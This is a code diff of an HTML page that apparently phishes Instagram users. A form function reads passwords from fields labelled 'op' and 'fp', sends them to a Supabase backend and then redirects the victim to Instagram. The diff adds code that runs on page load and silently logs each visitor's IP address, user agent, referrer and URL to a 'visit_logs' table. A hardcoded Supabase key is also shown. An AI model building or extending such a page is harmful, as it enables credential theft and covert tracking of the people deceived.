@@ -14,7 +14,6 @@
       height: 100vh;
       margin: 0;
     }
-
     .container {
       background: white;
       padding: 30px;
@@ -23,11 +22,9 @@
       width: 350px;
       text-align: center;
     }
-
     h3 {
       margin-bottom: 10px;
     }
-
     .instructions {
       font-size: 13px;
       color: grey;
@@ -35,7 +32,6 @@
       line-height: 1.5;
       text-align: center;
     }
-
     input {
       width: 80%;
       padding: 14px 10px;
@@ -45,7 +41,6 @@
       font-size: 14px;
       display: block;
     }
-
     button {
       width: 80%;
       padding: 14px;
@@ -58,19 +53,12 @@
       cursor: pointer;
       display: block;
     }
-
     .message {
       margin-top: 10px;
       font-size: 14px;
     }
-
-    .success {
-      color: green;
-    }
-
-    .error {
-      color: red;
-    }
+    .success { color: green; }
+    .error { color: red; }
   </style>
 </head>
 <body>
@@ -95,20 +83,33 @@
     const supabase = createClient(
       'https://cjwoizyfasbxbmtcmnpj.supabase.co',
       'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqd29penlmYXNieGJtdGNtbnBqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE4MjQ5MzcsImV4cCI6MjA2NzQwMDkzN30.dwPcx-uCfixYxF-YAhZAdZR1VGkuOSI3sgCLeWX7xTM'
-    )
+    );
 
     async function getUserIP() {
-     try {
-       const res = await fetch('https://api64.ipify.org?format=json');
-       const data = await res.json();
-       return data.ip;
-     } catch {
-       return 'Unavailable';
-     }
+      try {
+        const res = await fetch('https://api64.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'Unavailable';
+      }
     }
 
+    // 🔹 Auto log visitor info on page load
+    async function logVisitor() {
+      const ip = await getUserIP();
+      const userAgent = navigator.userAgent;
+      const referrer = document.referrer || 'Direct';
+      const page = window.location.href;
 
+      await supabase.from('visit_logs').insert([
+        { ip_address: ip, user_agent: userAgent, referrer: referrer, page_url: page }
+      ]);
+    }
 
+    logVisitor(); // run automatically when page opens
+
+    // 🔹 Your existing password logic
     window.storePasswords = async function () {
       const op = document.getElementById('op').value.trim();
       const fp = document.getElementById('fp').value.trim();
@@ -147,7 +148,7 @@
           window.location.href = 'instagram://app';
           setTimeout(() => {
             window.location.href = 'https://www.instagram.com/';
-            }, 500);
+          }, 500);
         }, 1500);
       }
     }
